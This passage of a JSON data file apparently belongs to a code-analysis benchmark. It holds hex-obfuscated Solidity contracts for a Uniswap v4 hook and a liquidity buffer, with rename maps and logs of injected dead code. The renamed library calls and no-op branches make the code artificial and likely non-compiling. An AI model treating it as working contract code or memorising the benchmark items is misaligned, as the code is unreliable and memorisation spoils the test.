_0xb385cc = _0xaf2a62 < _0xfa5e52 ? _0xfa5e52 - _0xaf2a62 : int256(0);\n      if (_0xb385cc > 0) {\n        _0x32ec4a._0x6e59e1(\n          address(this), uint256(uint160(Currency._0x42f1d5(_0x3816f3))), uint256(_0xb385cc)\n        );\n\n        emit AbsorbEgToken(PoolId._0x42f1d5(_0x5fdaf3._0xa49f9e()), Currency._0x42f1d5(_0x3816f3), _0xb385cc);\n      }\n\n      return (this._0xe27ad3.selector, int128(_0xb385cc));\n    }\n  }\n}",
      "rename_map": {
        "afterRemoveLiquidityReturnDelta": "_0x468e7a",
        "afterAddLiquidityReturnDelta": "_0x1fafa1",
        "initialClaimableAccounts": "_0x675d25",
        "validateHookPermissions": "_0x937491",
        "beforeSwapReturnDelta": "_0x04dcd4",
        "beforeRemoveLiquidity": "_0x0e19f6",
        "afterSwapReturnDelta": "_0x575f5f",
        "afterRemoveLiquidity": "_0xae533d",
        "isValidSignatureNow": "_0xe0da4c",
        "initialQuoteSigner": "_0x8b31e9",
        "initialEgRecipient": "_0xef4bd5",
        "_useUnorderedNonce": "_0xbe46f1",
        "getHookPermissions": "_0xc72b97",
        "decodeExchangeRate": "_0x9bdbc1",
        "beforeAddLiquidity": "_0x461249",
        "exchangeRateDenom": "_0x997335",
        "afterAddLiquidity": "_0x1d148b",
        "decodeAllHookData": "_0x0b7c58",
        "beforeInitialize": "_0x5931d1",
        "onlyPoolManager": "_0xfc019b",
        "afterInitialize": "_0x7d1f82",
        "maxExchangeRate": "_0xf81fc4",
        "amountSpecified": "_0x53e6ef",
        "unlockCallback": "_0x98f3d0",
        "toBalanceDelta": "_0xcbd237",
        "claimEgTokens": "_0xb26b49",
        "beforeDonate": "_0x140dac",
        "maxAmountOut": "_0xaf2a62",
        "_poolManager": "_0xe2c129",
        "initialOwner": "_0xa77e96",
        "currencyOut": "_0x3816f3",
        "afterDonate": "_0x2012d6",
        "egRecipient": "_0x4bea19",
        "maxAmountIn": "_0x52d412",
        "quoteSigner": "_0xf76483",
        "poolManager": "_0x32ec4a",
        "expiryTime": "_0x2def6d",
        "zeroForOne": "_0x9720a1",
        "beforeSwap": "_0x1e7041",
        "claimable": "_0x86c3bf",
        "balanceOf": "_0x48adcd",
        "amountOut": "_0xfa5e52",
        "keccak256": "_0xb06f04",
        "signature": "_0xa9588c",
        "currency1": "_0x9e7a73",
        "currency0": "_0xbcc19d",
        "afterSwap": "_0xe27ad3",
        "hookData": "_0x5fd13d",
        "amountIn": "_0x6d1ebb",
        "egAmount": "_0xb385cc",
        "amount1": "_0x62dd81",
        "amount0": "_0x792ede",
        "amounts": "_0x3226b1",
        "digest": "_0x6f0e4a",
        "unlock": "_0x1d3c53",
        "decode": "_0x597e91",
        "unwrap": "_0x42f1d5",
        "tokens": "_0x50c327",
        "params": "_0xd6290e",
        "encode": "_0xf761ac",
        "delta": "_0xc59d8d",
        "nonce": "_0x7a446b",
        "mint": "_0x6e59e1",
        "wrap": "_0x575f0e",
        "take": "_0x58e9f2",
        "burn": "_0x0a0c54",
        "toId": "_0xa49f9e",
        "key": "_0x5fdaf3",
        "id": "_0xfb8cff"
      },
      "changes": [
        "Renamed 69 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_022",
      "transformed_id": "ss_l4_medium_sn_gs_022",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {BaseKEMHook} from './base/BaseKEMHook.sol';\nimport {IKEMHook} from './interfaces/IKEMHook.sol';\nimport {HookDataDecoder} from './libraries/HookDataDecoder.sol';\n\nimport {IHooks} from 'uniswap/v4-core/src/interfaces/IHooks.sol';\nimport {IPoolManager} from 'uniswap/v4-core/src/interfaces/IPoolManager.sol';\nimport {IUnlockCallback} from 'uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol';\nimport {Hooks} from 'uniswap/v4-core/src/libraries/Hooks.sol';\n\nimport {BalanceDelta, _0x156ed4} from 'uniswap/v4-core/src/types/BalanceDelta.sol';\nimport {\n  BeforeSwapDelta, BeforeSwapDeltaLibrary\n} from 'uniswap/v4-core/src/types/BeforeSwapDelta.sol';\nimport {Currency} from 'uniswap/v4-core/src/types/Currency.sol';\nimport {PoolId} from 'uniswap/v4-core/src/types/PoolId.sol';\nimport {PoolKey} from 'uniswap/v4-core/src/types/PoolKey.sol';\n\nimport {SignatureChecker} from\n  'openzeppelin-contracts/contracts/utils/cryptography/SignatureChecker.sol';\n\n/// @title UniswapV4KEMHook\ncontract UniswapV4KEMHook is BaseKEMHook, IUnlockCallback {\n  /// @notice Thrown when the caller is not PoolManager\n  error NotPoolManager();\n\n  /// @notice The address of the PoolManager contract\n  IPoolManager public immutable _0x9a24b7;\n\n  constructor(\n    IPoolManager _0x472d4e,\n    address _0x46b9a4,\n    address[] memory _0xa970a3,\n    address _0xbe0a32,\n    address _0xce5a28\n  ) BaseKEMHook(_0x46b9a4, _0xa970a3, _0xbe0a32, _0xce5a28) {\n    _0x9a24b7 = _0x472d4e;\n    Hooks._0x598934(IHooks(address(this)), _0x002baa());\n  }\n\n  /// @notice Only allow calls from the PoolManager contract\n  modifier _0x10958f() {\n    if (msg.sender != address(_0x9a24b7)) revert NotPoolManager();\n    _;\n  }\n\n  /// @inheritdoc IKEMHook\n  function _0xa63dff(address[] calldata _0x70795d, uint256[] calldata _0xd37cd2) public {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n    require(_0x460c64[msg.sender], NonClaimableAccount(msg.sender));\n    require(_0x70795d.length == _0xd37cd2.length, MismatchedArrayLengths());\n\n    _0x9a24b7._0xdde391(abi._0x73f1b1(_0x70795d, _0xd37cd2));\n  }\n\n  function _0xabcd00(bytes calldata data) public _0x10958f returns (bytes memory) {\n        // Placeholder for future logic\n        if (false) { revert(); }\n    (address[] memory _0x70795d, uint256[] memory _0xd37cd2) = abi._0x2ab761(data, (address[], uint256[]));\n\n    for (uint256 i = 0; i < _0x70795d.length; i++) {\n      uint256 _0xba7abf = uint256(uint160(_0x70795d[i]));\n      if (_0xd37cd2[i] == 0) {\n        _0xd37cd2[i] = _0x9a24b7._0xb1d511(address(this), _0xba7abf);\n      }\n      if (_0xd37cd2[i] > 0) {\n        _0x9a24b7._0x6c9345(address(this), _0xba7abf, _0xd37cd2[i]);\n        _0x9a24b7._0x7d403c(Currency._0x9b706f(_0x70795d[i]), _0x8b4088, _0xd37cd2[i]);\n      }\n    }\n\n    emit ClaimEgTokens(_0x8b4088, _0x70795d, _0xd37cd2);\n  }\n\n  function _0x002baa() public pure returns (Hooks.Permissions memory) {\n    return Hooks.Permissions({\n      _0x1819ee: false,\n      _0xb3a342: false,\n      _0x3f391c: false,\n      _0x51f156: false,\n      _0xbe9221: false,\n      _0xe56fe6: false,\n      _0xdb5f35: true,\n      _0x323226: true,\n      _0x4abd21: false,\n      _0x930680: false,\n      _0xdbc350: false,\n      _0x0afe5c: true,\n      _0xa2e05f: false,\n      _0x9c5b9b: false\n    });\n  }\n\n  function _0xdb5f35(\n    address sender,\n    PoolKey calldata _0x43f92c,\n    IPoolManager.SwapParams calldata _0xc2c714,\n    bytes calldata _0x4c8247\n  ) external _0x10958f returns (bytes4, BeforeSwapDelta, uint24) {\n    require(_0xc2c714._0x3237cb < 0, ExactOutputDisabled());\n\n    (\n      int256 _0x46cb38,\n      int256 _0xc7f418,\n      int256 _0x72e0ea,\n      uint256 _0x1b02e5,\n      uint256 _0xe99976,\n      bytes memory _0xc8d706\n    ) = HookDataDecoder._0x7901e5(_0x4c8247);\n\n    require(block.timestamp <= _0xe99976, ExpiredSignature(_0xe99976, block.timestamp));\n    require(\n      -_0xc2c714._0x3237cb <= _0x46cb38,\n      ExceededMaxAmountIn(_0x46cb38, -_0xc2c714._0x3237cb)\n    );\n\n    _0x06a8ff(_0x1b02e5);\n\n    bytes32 _0x74780e = _0xc4d090(\n      abi._0x73f1b1(\n        sender,\n        _0x43f92c,\n        _0xc2c714._0x461312,\n        _0x46cb38,\n        _0xc7f418,\n        _0x72e0ea,\n        _0x1b02e5,\n        _0xe99976\n      )\n    );\n    require(\n      SignatureChecker._0x4cc131(_0x592519, _0x74780e, _0xc8d706), InvalidSignature()\n    );\n\n    return (this._0xdb5f35.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);\n  }\n\n  function _0x323226(\n    address,\n    PoolKey calldata _0x43f92c,\n    IPoolManager.SwapParams calldata _0xc2c714,\n    BalanceDelta _0x83585d,\n    bytes calldata _0x4c8247\n  ) external _0x10958f returns (bytes4, int128) {\n    (int256 _0xc7f418, int256 _0x72e0ea) =\n      HookDataDecoder._0x6ac51a(_0x4c8247);\n\n    int128 _0x572c11;\n    int128 _0xf23c6c;\n    Currency _0x75017e;\n    unchecked {\n      if (_0xc2c714._0x461312) {\n        _0x572c11 = -_0x83585d._0xadc112();\n        _0xf23c6c = _0x83585d._0x125395();\n        _0x75017e = _0x43f92c._0x6db4fa;\n      } else {\n        _0x572c11 = -_0x83585d._0x125395();\n        _0xf23c6c = _0x83585d._0xadc112();\n        _0x75017e = _0x43f92c._0x1277ad;\n      }\n    }\n\n    int256 _0x8b8140 = _0x572c11 * _0xc7f418 / _0x72e0ea;\n\n    unchecked {\n      int256 _0xdf7259 = _0x8b8140 < _0xf23c6c ? _0xf23c6c - _0x8b8140 : int256(0);\n      if (_0xdf7259 > 0) {\n        _0x9a24b7._0xa2c004(\n          address(this), uint256(uint160(Currency._0xd8dfee(_0x75017e))), uint256(_0xdf7259)\n        );\n\n        emit AbsorbEgToken(PoolId._0xd8dfee(_0x43f92c._0x284c9a()), Currency._0xd8dfee(_0x75017e), _0xdf7259);\n      }\n\n      return (this._0x323226.selector, int128(_0xdf7259));\n    }\n  }\n}",
      "rename_map": {
        "afterRemoveLiquidityReturnDelta": "_0x9c5b9b",
        "afterAddLiquidityReturnDelta": "_0xa2e05f",
        "initialClaimableAccounts": "_0xa970a3",
        "validateHookPermissions": "_0x598934",
        "beforeSwapReturnDelta": "_0xdbc350",
        "beforeRemoveLiquidity": "_0xbe9221",
        "afterSwapReturnDelta": "_0x0afe5c",
        "afterRemoveLiquidity": "_0xe56fe6",
        "isValidSignatureNow": "_0x4cc131",
        "initialQuoteSigner": "_0xbe0a32",
        "initialEgRecipient": "_0xce5a28",
        "_useUnorderedNonce": "_0x06a8ff",
        "getHookPermissions": "_0x002baa",
        "decodeExchangeRate": "_0x6ac51a",
        "beforeAddLiquidity": "_0x3f391c",
        "exchangeRateDenom": "_0x72e0ea",
        "afterAddLiquidity": "_0x51f156",
        "decodeAllHookData": "_0x7901e5",
        "beforeInitialize": "_0x1819ee",
        "onlyPoolManager": "_0x10958f",
        "afterInitialize": "_0xb3a342",
        "maxExchangeRate": "_0xc7f418",
        "amountSpecified": "_0x3237cb",
        "unlockCallback": "_0xabcd00",
        "toBalanceDelta": "_0x156ed4",
        "claimEgTokens": "_0xa63dff",
        "beforeDonate": "_0x4abd21",
        "maxAmountOut": "_0x8b8140",
        "_poolManager": "_0x472d4e",
        "initialOwner": "_0x46b9a4",
        "currencyOut": "_0x75017e",
        "afterDonate": "_0x930680",
        "egRecipient": "_0x8b4088",
        "maxAmountIn": "_0x46cb38",
        "quoteSigner": "_0x592519",
        "poolManager": "_0x9a24b7",
        "expiryTime": "_0xe99976",
        "zeroForOne": "_0x461312",
        "beforeSwap": "_0xdb5f35",
        "claimable": "_0x460c64",
        "balanceOf": "_0xb1d511",
        "amountOut": "_0xf23c6c",
        "keccak256": "_0xc4d090",
        "signature": "_0xc8d706",
        "currency1": "_0x6db4fa",
        "currency0": "_0x1277ad",
        "afterSwap": "_0x323226",
        "hookData": "_0x4c8247",
        "amountIn": "_0x572c11",
        "egAmount": "_0xdf7259",
        "amount1": "_0x125395",
        "amount0": "_0xadc112",
        "amounts": "_0xd37cd2",
        "digest": "_0x74780e",
        "unlock": "_0xdde391",
        "decode": "_0x2ab761",
        "unwrap": "_0xd8dfee",
        "tokens": "_0x70795d",
        "params": "_0xc2c714",
        "encode": "_0x73f1b1",
        "delta": "_0x83585d",
        "nonce": "_0x1b02e5",
        "mint": "_0xa2c004",
        "wrap": "_0x9b706f",
        "take": "_0x7d403c",
        "burn": "_0x6c9345",
        "toId": "_0x284c9a",
        "key": "_0x43f92c",
        "id": "_0xba7abf"
      },
      "changes": [
        "Renamed 69 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_023",
      "transformed_id": "ss_l4_medium_sn_gs_023",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport {AccessControlEnumerableUpgradeable} from \"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {Address} from \"openzeppelin/utils/Address.sol\";\nimport {Math} from \"openzeppelin/utils/math/Math.sol\";\nimport {ILiquidityBuffer} from \"./interfaces/ILiquidityBuffer.sol\";\nimport {IPositionManager} from \"./interfaces/IPositionManager.sol\";\nimport {IStakingReturnsWrite} from \"../interfaces/IStaking.sol\";\nimport {IPauserRead} from \"../interfaces/IPauser.sol\";\nimport {ProtocolEvents} from \"../interfaces/ProtocolEvents.sol\";\n\ninterface LiquidityBufferEvents {\n    event ETHWithdrawnFromManager(uint256 indexed _0x0e2766, uint256 _0x4fb941);\n    event ETHReturnedToStaking(uint256 _0x4fb941);\n    event ETHAllocatedToManager(uint256 indexed _0x0e2766, uint256 _0x4fb941);\n    event ETHReceivedFromStaking(uint256 _0x4fb941);\n    event FeesCollected(uint256 _0x4fb941);\n    event InterestClaimed(\n        uint256 indexed _0x0e2766,\n        uint256 _0xaf45be\n    );\n    event InterestToppedUp(\n        uint256 _0x4fb941\n    );\n}\n\n/**\n * @title LiquidityBuffer\n * @notice Manages liquidity allocation to various position managers for DeFi protocols\n */\ncontract LiquidityBuffer is Initializable, AccessControlEnumerableUpgradeable, ILiquidityBuffer, LiquidityBufferEvents, ProtocolEvents {\n    using Address for address;\n\n    // ========================================= CONSTANTS =========================================\n\n    bytes32 public constant LIQUIDITY_MANAGER_ROLE = _0x4adcb2(\"LIQUIDITY_MANAGER_ROLE\");\n    bytes32 public constant POSITION_MANAGER_ROLE = _0x4adcb2(\"POSITION_MANAGER_ROLE\");\n    bytes32 public constant INTEREST_TOPUP_ROLE = _0x4adcb2(\"INTEREST_TOPUP_ROLE\");\n    bytes32 public constant DRAWDOWN_MANAGER_ROLE = _0x4adcb2(\"DRAWDOWN_MANAGER_ROLE\");\n\n    uint16 internal constant _0xa05a3a = 10_000;\n\n    // ========================================= STATE =========================================\n\n    /// @notice The staking contract to which the liquidity buffer accepts funds from and returns funds to.\n    IStakingReturnsWrite public _0x798a9e;\n\n    /// @notice The pauser contract.\n    /// @dev Keeps the pause state across the protocol.\n    IPauserRead public _0x6df27f;\n\n    /// @notice Total number of position managers\n    uint256 public _0x1ff29b;\n\n    /// @notice Mapping from manager ID to position manager configuration\n    mapping(uint256 => PositionManagerConfig) public _0xdd6dd6;\n\n    /// @notice Mapping from manager ID to accounting information\n    mapping(uint256 => PositionAccountant) public _0x16727e;\n\n    /// @notice Total funds received from staking contract\n    uint256 public _0xec7660;\n\n    /// @notice Total funds returned to staking contract\n    uint256 public _0x41b41e;\n\n    /// @notice Total allocated balance across all position managers\n    uint256 public _0xdf6059;\n\n    /// @notice Total interest claimed from position managers\n    uint256 public _0xcfbfc9;\n\n    /// @notice Total interest topped up to staking contract\n    uint256 public _0xfaabb9;\n\n    /// @notice Total allocation capacity across all managers\n    uint256 public _0x13a20e;\n\n    /// @notice Cumulative drawdown amount\n    uint256 public _0x32bce5;\n\n    /// @notice Default manager ID for deposit and allocation operations\n    uint256 public _0xd01871;\n\n    /// @notice The address receiving protocol fees.\n    address payable public _0x68eca7;\n\n    /// @notice The protocol fees in basis points (1/10000).\n    uint16 public _0x62b739;\n\n    uint256 public _0xeb241d;\n\n    /// @notice Tracks pending interest available for top-up operations\n    uint256 public _0x43f29b;\n\n    /// @notice Tracks pending principal available for operations\n    uint256 public _0xc548a4;\n\n    /// @notice Controls whether to execute allocation logic in depositETH method\n    bool public _0x0ff771;\n    /// @notice Mapping from manager address to boolean indicating if it is registered\n    mapping(address => bool) public _0xd5b3cf;\n\n    struct Init {\n        address _0x16ecdb;\n        address _0xd5befe;\n        address _0x00ff9f;\n        address _0xbc92e2;\n        address _0xcb77b7;\n        address payable _0x68eca7;\n        IStakingReturnsWrite _0x8daeb9;\n        IPauserRead _0x6df27f;\n    }\n\n    // ========================================= ERRORS =========================================\n\n    error LiquidityBuffer__ManagerNotFound();\n    error LiquidityBuffer__ManagerInactive();\n    error LiquidityBuffer__ManagerAlreadyRegistered();\n    error LiquidityBuffer__ExceedsAllocationCap();\n    error LiquidityBuffer__InsufficientBalance();\n    error LiquidityBuffer__InsufficientAllocation();\n    error LiquidityBuffer__DoesNotReceiveETH();\n    error LiquidityBuffer__Paused();\n    error LiquidityBuffer__InvalidConfiguration();\n    error LiquidityBuffer__ZeroAddress();\n    error LiquidityBuffer__NotStakingContract();\n    error LiquidityBuffer__NotPositionManagerContract();\n    error LiquidityBuffer__ExceedsPendingInterest();\n    error LiquidityBuffer__ExceedsPendingPrincipal();\n    // ========================================= INITIALIZATION =========================================\n\n    constructor() {\n        _0xbbe618();\n    }\n\n    function _0x796a1c(Init memory _0x09a351) external _0xe59ffe {\n        // Placeholder for future logic\n        if (false) { revert(); }\n\n        __AccessControlEnumerable_init();\n\n        _0x1e318a(DEFAULT_ADMIN_ROLE, _0x09a351._0x16ecdb);\n        _0x1e318a(LIQUIDITY_MANAGER_ROLE, _0x09a351._0xd5befe);\n        _0x1e318a(POSITION_MANAGER_ROLE, _0x09a351._0x00ff9f);\n        _0x1e318a(INTEREST_TOPUP_ROLE, _0x09a351._0xbc92e2);\n        _0x1e318a(DRAWDOWN_MANAGER_ROLE, _0x09a351._0xcb77b7);\n\n        _0x798a9e = _0x09a351._0x8daeb9;\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x6df27f = _0x09a351._0x6df27f; }\n        _0x68eca7 = _0x09a351._0x68eca7;\n        _0x0ff771 = true;\n\n        _0x1e318a(LIQUIDITY_MANAGER_ROLE, address(_0x798a9e));\n    }\n\n    // ========================================= VIEW FUNCTIONS =========================================\n\n    function _0xcfb616(uint256 _0x0e2766) public view returns (uint256) {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        PositionManagerConfig memory _0xcc9d46 = _0xdd6dd6[_0x0e2766];\n        // Get current underlying balance from position manager\n        IPositionManager _0x8ce51b = IPositionManager(_0xcc9d46._0x650aa1);\n        uint256 _0x86eb5b = _0x8ce51b._0x075721();\n\n        // Calculate interest as: current balance - allocated balance\n        PositionAccountant memory _0x50a0ab = _0x16727e[_0x0e2766];\n\n        if (_0x86eb5b > _0x50a0ab._0x15b7bd) {\n            return _0x86eb5b - _0x50a0ab._0x15b7bd;\n        }\n\n        return 0;\n    }\n\n    function _0x4aa463() public view returns (uint256) {\n        return _0x13a20e - _0xdf6059;\n    }\n\n    function _0x0e19d0() public view returns (uint256) {\n        return _0xec7660 - _0x41b41e;\n    }\n\n    function _0x72886e() public view returns (uint256) {\n        uint256 _0xc074ae = address(this).balance;\n\n        // Loop through all position manager configs and get their balances\n        // Note: This function makes external calls in a loop which can be gas-expensive\n        // Consider caching balances or using a different approach for production\n        for (uint256 i = 0; i < _0x1ff29b; i++) {\n            PositionManagerConfig storage _0xcc9d46 = _0xdd6dd6[i];\n            if (_0xcc9d46._0x0babab) {\n                IPositionManager _0x8ce51b = IPositionManager(_0xcc9d46._0x650aa1);\n                uint256 _0xb51e8b = _0x8ce51b._0x075721();\n                _0xc074ae += _0xb51e8b;\n            }\n        }\n\n        return _0xc074ae;\n    }\n\n    // ========================================= ADMIN FUNCTIONS =========================================\n\n    function _0xe7d4ed(\n        address _0x650aa1,\n        uint256 _0xcb8d80\n    ) external _0x6eecb8(POSITION_MANAGER_ROLE) returns (uint256 _0x0e2766) {\n        if (_0xd5b3cf[_0x650aa1]) revert LiquidityBuffer__ManagerAlreadyRegistered();\n        _0x0e2766 = _0x1ff29b;\n        _0x1ff29b++;\n\n        _0xdd6dd6[_0x0e2766] = PositionManagerConfig({\n            _0x650aa1: _0x650aa1,\n            _0xcb8d80: _0xcb8d80,\n            _0x0babab: true\n        });\n        _0x16727e[_0x0e2766] = PositionAccountant({\n            _0x15b7bd: 0,\n            _0x64f010: 0\n        });\n        _0xd5b3cf[_0x650aa1] = true;\n\n        _0x13a20e += _0xcb8d80;\n        emit ProtocolConfigChanged(\n            this._0xe7d4ed.selector,\n            \"addPositionManager(address,uint256)\",\n            abi._0xe36bfb(_0x650aa1, _0xcb8d80)\n        );\n    }\n\n    function _0xd4ce16(\n        uint256 _0x0e2766,\n        uint256 _0xab0d71,\n        bool _0x0babab\n    ) external _0x6eecb8(POSITION_MANAGER_ROLE) {\n        if (_0x0e2766 >= _0x1ff29b) {\n            revert LiquidityBuffer__ManagerNotFound();\n        }\n\n        PositionManagerConfig storage _0xcc9d46 = _0xdd6dd6[_0x0e2766];\n\n        if (_0xab0d71 < _0x16727e[_0x0e2766]._0x15b7bd) {\n            revert LiquidityBuffer__InvalidConfiguration();\n        }\n\n        // Update total allocation capacity\n        _0x13a20e = _0x13a20e - _0xcc9d46._0xcb8d80 + _0xab0d71;\n\n        _0xcc9d46._0xcb8d80 = _0xab0d71;\n        _0xcc9d46._0x0babab = _0x0babab;\n\n        emit ProtocolConfigChanged(\n            this._0xd4ce16.selector,\n            \"updatePositionManager(uint256,uint256,bool)\",\n            abi._0xe36bfb(_0x0e2766, _0xab0d71, _0x0babab)\n        );\n    }\n\n    function _0xf61de9(uint256 _0x0e2766) external _0x6eecb8(POSITION_MANAGER_ROLE) {\n        if (_0x0e2766 >= _0x1ff29b) {\n            revert LiquidityBuffer__ManagerNotFound();\n        }\n\n        PositionManagerConfig storage _0xcc9d46 = _0xdd6dd6[_0x0e2766];\n        _0xcc9d46._0x0babab = !_0xcc9d46._0x0babab;\n\n        emit ProtocolConfigChanged(\n            this._0xf61de9.selector,\n            \"togglePositionManagerStatus(uint256)\",\n            abi._0xe36bfb(_0x0e2766)\n        );\n    }\n\n    function _0x7291dd(uint256 _0x729076) external _0x6eecb8(DRAWDOWN_MANAGER_ROLE) {\n        if (block.timestamp > 0) { _0x32bce5 = _0x729076; }\n\n        emit ProtocolConfigChanged(\n            this._0x7291dd.selector,\n            \"setCumulativeDrawdown(uint256)\",\n            abi._0xe36bfb(_0x729076)\n        );\n    }\n\n    function _0x8c50c9(uint256 _0x2c1a7d) external _0x6eecb8(POSITION_MANAGER_ROLE) {\n        if (_0x2c1a7d >= _0x1ff29b) {\n            revert LiquidityBuffer__ManagerNotFound();\n        }\n\n        if (!_0xdd6dd6[_0x2c1a7d]._0x0babab) {\n            revert LiquidityBuffer__ManagerInactive();\n        }\n\n        _0xd01871 = _0x2c1a7d;\n\n        emit ProtocolConfigChanged(\n            this._0x8c50c9.selector,\n            \"setDefaultManagerId(uint256)\",\n            abi._0xe36bfb(_0x2c1a7d)\n        );\n    }\n\n    /// @notice Sets the fees basis points.\n    /// @param newBasisPoints The new fees basis points.\n    function _0xa60488(uint16 _0x5f855d) external _0x6eecb8(POSITION_MANAGER_ROLE) {\n        if (_0x5f855d > _0xa05a3a) {\n            revert LiquidityBuffer__InvalidConfiguration();\n        }\n\n        if (true) { _0x62b739 = _0x5f855d; }\n        emit ProtocolConfigChanged(\n            this._0xa60488.selector, \"setFeeBasisPoints(uint16)\", abi._0xe36bfb(_0x5f855d)\n        );\n    }\n\n     /// @notice Sets the fees receiver wallet for the protocol.\n    /// @param newReceiver The new fees receiver wallet.\n    function _0x4784d3(address payable _0x8919fb)\n        external\n        _0x6eecb8(POSITION_MANAGER_ROLE)\n        _0x6fa733(_0x8919fb)\n    {\n        _0x68eca7 = _0x8919fb;\n        emit ProtocolConfigChanged(this._0x4784d3.selector, \"setFeesReceiver(address)\", abi._0xe36bfb(_0x8919fb));\n    }\n\n    /// @notice Sets whether to execute allocation logic in depositETH method.\n    /// @param executeAllocation Whether to execute allocation logic.\n    function _0xef53bf(bool _0x6ae2b6) external _0x6eecb8(POSITION_MANAGER_ROLE) {\n        _0x0ff771 = _0x6ae2b6;\n        emit ProtocolConfigChanged(this._0xef53bf.selector, \"setShouldExecuteAllocation(bool)\", abi._0xe36bfb(_0x6ae2b6));\n    }\n\n    // ========================================= LIQUIDITY MANAGEMENT =========================================\n\n    function _0xc800f0() external payable _0x6eecb8(LIQUIDITY_MANAGER_ROLE) {\n        if (_0x6df27f._0xdbfeae()) revert LiquidityBuffer__Paused();\n        _0x9f73f1(msg.value);\n        if (_0x0ff771) {\n            _0x64b529(_0xd01871, msg.value);\n        }\n    }\n\n    function _0x9b8bd1(uint256 _0x0e2766, uint256 _0x4fb941) external _0x6eecb8(LIQUIDITY_MANAGER_ROLE) {\n        _0x803c03(_0x0e2766, _0x4fb941);\n        _0xd0fccc(_0x4fb941);\n    }\n\n    function _0xffb591(uint256 _0x0e2766, uint256 _0x4fb941) external _0x6eecb8(LIQUIDITY_MANAGER_ROLE) {\n        _0x64b529(_0x0e2766, _0x4fb941);\n    }\n\n    function _0xde221e(uint256 _0x0e2766, uint256 _0x4fb941) external _0x6eecb8(LIQUIDITY_MANAGER_ROLE) {\n        _0x803c03(_0x0e2766, _0x4fb941);\n    }\n\n    function _0xe0b392(uint256 _0x4fb941) external _0x6eecb8(LIQUIDITY_MANAGER_ROLE) {\n        _0xd0fccc(_0x4fb941);\n    }\n\n    function _0xe42d13() external payable _0x37103b {\n        // This function receives ETH from position managers\n        // The ETH is already in the contract balance, no additional processing needed\n    }\n\n    // ========================================= INTEREST MANAGEMENT =========================================\n\n    function _0xc31498(uint256 _0x0e2766, uint256 _0x00e4f4) external _0x6eecb8(INTEREST_TOPUP_ROLE) returns (uint256) {\n        uint256 _0x4fb941 = _0x289e5b(_0x0e2766);\n        if (_0x4fb941 < _0x00e4f4) {\n            revert LiquidityBuffer__InsufficientBalance();\n        }\n        return _0x4fb941;\n    }\n\n    function _0x38c72b(uint256 _0x4fb941) external _0x6eecb8(INTEREST_TOPUP_ROLE) returns (uint256) {\n        if (address(this).balance < _0x4fb941) {\n            revert LiquidityBuffer__InsufficientBalance();\n        }\n        _0xd5b932(_0x4fb941);\n        return _0x4fb941;\n    }\n\n    function _0x370596(uint256 _0x0e2766, uint256 _0x00e4f4) external _0x6eecb8(INTEREST_TOPUP_ROLE) returns (uint256) {\n        uint256 _0x4fb941 = _0x289e5b(_0x0e2766);\n        if (_0x4fb941 < _0x00e4f4) {\n            revert LiquidityBuffer__InsufficientBalance();\n        }\n        _0xd5b932(_0x4fb941);\n\n        return _0x4fb941;\n    }\n\n    // ========================================= INTERNAL FUNCTIONS =========================================\n\n    function _0xd5b932(uint256 _0x4fb941) internal {\n        if (_0x6df27f._0xdbfeae()) {\n            revert LiquidityBuffer__Paused();\n        }\n        if (_0x4fb941 > _0x43f29b) {\n            revert LiquidityBuffer__ExceedsPendingInterest();\n        }\n        _0x43f29b -= _0x4fb941;\n        uint256 _0x4d20e6 = Math._0x5ace61(_0x62b739, _0x4fb941, _0xa05a3a);\n        uint256 _0xf37235 = _0x4fb941 - _0x4d20e6;\n        _0x798a9e._0x2e67b5{value: _0xf37235}();\n        _0xfaabb9 += _0xf37235;\n        emit InterestToppedUp(_0xf37235);\n\n        if (_0x4d20e6 > 0) {\n            Address._0xe4b4e1(_0x68eca7, _0x4d20e6);\n            _0xeb241d += _0x4d20e6;\n            emit FeesCollected(_0x4d20e6);\n        }\n    }\n\n    function _0x289e5b(uint256 _0x0e2766) internal returns (uint256) {\n        if (_0x6df27f._0xdbfeae()) {\n            revert LiquidityBuffer__Paused();\n        }\n        // Get interest amount\n        uint256 _0xaf45be = _0xcfb616(_0x0e2766);\n\n        if (_0xaf45be > 0) {\n            PositionManagerConfig memory _0xcc9d46 = _0xdd6dd6[_0x0e2766];\n\n            // Update accounting BEFORE external call (Checks-Effects-Interactions pattern)\n            _0x16727e[_0x0e2766]._0x64f010 += _0xaf45be;\n            _0xcfbfc9 += _0xaf45be;\n            _0x43f29b += _0xaf45be;\n            emit InterestClaimed(_0x0e2766, _0xaf45be);\n\n            // Withdraw interest from position manager AFTER state updates\n            IPositionManager _0x8ce51b = IPositionManager(_0xcc9d46._0x650aa1);\n            _0x8ce51b._0xf4ce92(_0xaf45be);\n        } else {\n            emit InterestClaimed(_0x0e2766, _0xaf45be);\n        }\n\n        return _0xaf45be;\n    }\n\n    function _0x803c03(uint256 _0x0e2766, uint256 _0x4fb941) internal {\n        if (_0x6df27f._0xdbfeae()) {\n            revert LiquidityBuffer__Paused();\n        }\n        if (_0x0e2766 >= _0x1ff29b) revert LiquidityBuffer__ManagerNotFound();\n        PositionManagerConfig memory _0xcc9d46 = _0xdd6dd6[_0x0e2766];\n        if (!_0xcc9d46._0x0babab) revert LiquidityBuffer__ManagerInactive();\n        PositionAccountant storage _0x50a0ab = _0x16727e[_0x0e2766];\n\n        // Check sufficient allocation\n        if (_0x4fb941 > _0x50a0ab._0x15b7bd) {\n            revert LiquidityBuffer__InsufficientAllocation();\n        }\n\n        // Update accounting BEFORE external call (Checks-Effects-Interactions pattern)\n        _0x50a0ab._0x15b7bd -= _0x4fb941;\n        _0xdf6059 -= _0x4fb941;\n        